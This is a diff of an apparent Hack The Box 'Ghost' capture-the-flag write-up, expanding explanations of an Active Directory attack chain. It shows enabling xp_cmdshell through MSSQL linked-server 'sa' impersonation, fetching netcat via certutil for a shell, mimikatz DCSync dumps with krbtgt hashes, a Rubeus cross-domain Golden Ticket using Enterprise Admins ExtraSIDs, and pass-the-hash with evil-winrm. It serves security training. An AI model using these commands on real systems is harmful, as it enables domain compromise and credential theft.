@@ -6,6 +6,8 @@ tags: ["htb", "windows", "adfs", "golden-saml", "mssql", "ldap-injection", "kerb
 draft: false
 ---
 
+![Ghost has been Pwned by kanyo on 19 Jun 2026](/images/writeups/htb-ghost/ghost-pwned.png)
+
 Ghost is the kind of box you respect even when it's frustrating you. Two domains, a forest trust, a container, a Linux dev workstation, ADFS, linked SQL servers. The chain is long and every step is distinct. Nothing is filler. You're not repeating the same technique twice.
 
 The short version: LDAP injection gets you into an intranet app, blind injection extracts a Gitea password, a path traversal in Ghost CMS hands you an env key that unlocks a command injection endpoint. From the container you hijack an SSH ControlMaster socket and land on a dev machine as a domain user with an active TGT. From there DNS poisoning gets you another user's hash, and that user has ReadGMSAPassword on the ADFS service account. You dump the ADFS token-signing keys, forge a Golden SAML assertion as Administrator, and walk into the Ghost config panel, which happens to have an MSSQL query interface connected to both domains. SA impersonation, EfsPotato for SYSTEM, DCSync the corp domain, then craft a cross-forest Golden Ticket with the Enterprise Admins ExtraSID to DCSync the parent domain. That's the whole thing.
@@ -323,7 +325,9 @@ Ghost Config Panel. Two linked MSSQL instances: one on `ghost.htb`, one on `corp
 
 ### MSSQL Lateral Movement
 
-The panel let me run SQL against the main instance. Checked for impersonation rights on the linked server (`PRIMARY` is `corp.ghost.htb`):
+The panel let me run SQL against the main `ghost.htb` instance. MSSQL's linked server feature lets one SQL Server instance query another, and you can sometimes route execution through that link. The Ghost Config Panel had two instances wired together: `ghost.htb` as the local and `corp.ghost.htb` (`PRIMARY`) as the remote. `OPENQUERY` sends a query directly to the linked server and returns the result. When you run `EXECUTE AS LOGIN = 'sa'` inside that query, you're elevating to SA in the context of the remote server, not the local one.
+
+So the question is: does the linked server's configuration allow impersonation of `sa`?
 
 ```sql
 select result from openquery("PRIMARY",
@@ -336,14 +340,17 @@ select result from openquery("PRIMARY",
 result: sa
 ```
 
-Impersonate `sa` on the remote server, enable `xp_cmdshell`, get code execution:
+It does. Enabled `xp_cmdshell` through the link and ran a command:
 
 ```sql
-EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami''') AT [PRIMARY]
+EXEC ('EXECUTE AS LOGIN = ''sa'';
+  EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
+  EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;
+  EXEC xp_cmdshell ''whoami''') AT [PRIMARY]
 -- nt service\mssqlserver
 ```
 
-Uploaded nc64.exe via certutil, caught a shell on the corp DC as `NT SERVICE\MSSQLSERVER`.
+Uploaded nc64.exe via certutil and caught a shell on the corp DC as `NT SERVICE\MSSQLSERVER`.
 
 ### EfsPotato to SYSTEM
 
@@ -360,7 +367,7 @@ SYSTEM on `PRIMARY.corp.ghost.htb`.
 
 ### Cross-Forest Golden Ticket
 
-DCSync the corp domain to get the `krbtgt` hash:
+First, DCSync corp to get the `krbtgt` hash. This requires SYSTEM or DA on corp, which we have:
 
 ```powershell
 .\mimikatz.exe "lsadump::dcsync /domain:corp.ghost.htb /user:krbtgt" "exit"
@@ -369,12 +376,20 @@ Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
 aes256_hmac: b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
 ```
 
-Now for the cross-forest part. When two domains in the same forest have a trust, Kerberos uses SID history and `ExtraSIDs` to carry group memberships across domain boundaries. If you forge a TGT for `corp.ghost.htb` and inject the `Enterprise Admins` SID from `ghost.htb` into the PAC, the parent DC will treat you as an Enterprise Admin when you present that ticket.
+Now the interesting part. Before explaining what to run, it's worth understanding why this is possible at all, because the conditions matter.
 
-You need:
-- `krbtgt` AES key of the child domain (`corp.ghost.htb`): ✓
+`ghost.htb` and `corp.ghost.htb` are two domains in the same Active Directory forest, with a parent-child trust between them. BloodHound labeled it `SameForestTrust`. That detail is critical. In an AD forest, parent-child trusts are automatic, transitive, and two-way. The trust key is derived from an inter-realm trust account that both KDCs share. When a user in the child domain needs to access something in the parent, the child KDC issues a referral ticket encrypted with that shared trust key.
+
+What makes cross-domain Kerberos exploitable here is the PAC (Privilege Attribute Certificate). Every Kerberos ticket carries a PAC: a signed blob containing the user's SID, group SIDs, and a field called `ExtraSIDs`, which was designed to carry SID history entries for migrated accounts. When the parent KDC processes a referral ticket from the child, it reads the PAC and trusts the contents, including ExtraSIDs. Normally those entries are legitimately populated. If you forged the ticket, you write whatever you want.
+
+So: forge a Golden Ticket for the child domain using the child's `krbtgt` AES key. In the PAC, inject the Enterprise Admins SID from the parent domain (`<parent_SID>-519`) into the ExtraSIDs field. When you present this to the parent DC to request a service ticket, the parent KDC validates the inter-realm key (succeeds, because you used the real child krbtgt), reads the PAC, sees Enterprise Admins, and issues you a fully-privileged ticket against the parent domain.
+
+**This only works intraforest.** When the trust crosses a true forest boundary (separate forests, separate `msDS-TrustAttributes` configurations), Windows applies SID Filtering: it strips any ExtraSIDs that don't originate from the same forest. Enterprise Admins from another forest gets silently dropped. The attack fails silently. The reason it works here is specifically because `corp.ghost.htb` is a child domain inside the `ghost.htb` forest, not a separate forest.
+
+You need three things:
+- `krbtgt` AES key of the child domain (`corp.ghost.htb`): done
 - Child domain SID: `S-1-5-21-2034262909-2733679486-179904498`
-- Parent's Enterprise Admins SID: `S-1-5-21-4084500788-938703357-3654145966-519`
+- Parent's Enterprise Admins SID: `S-1-5-21-4084500788-938703357-3654145966-519` (parent SID + `-519`)
 
 ```powershell
 .\Rubeus.exe golden \
@@ -389,7 +404,7 @@ You need:
 [+] Ticket successfully imported!
 ```
 
-With that ticket loaded, DCSync the parent domain:
+The ticket is loaded in memory. From here, DCSync the parent domain directly:
 
 ```powershell
 .\mimikatz.exe "lsadump::dcsync /domain:ghost.htb /dc:DC01.ghost.htb /user:ghost\administrator" "exit"
@@ -402,8 +417,6 @@ Pass the hash into WinRM on the DC:
 ```bash
 evil-winrm -i DC01.ghost.htb -u administrator -H 1cdb17d5c14ff69e7067cffcc9e470bd
 ```
-
-![Ghost has been Pwned by kanyo on 19 Jun 2026](/images/writeups/htb-ghost/ghost-pwned.png)
 
 ## References
 
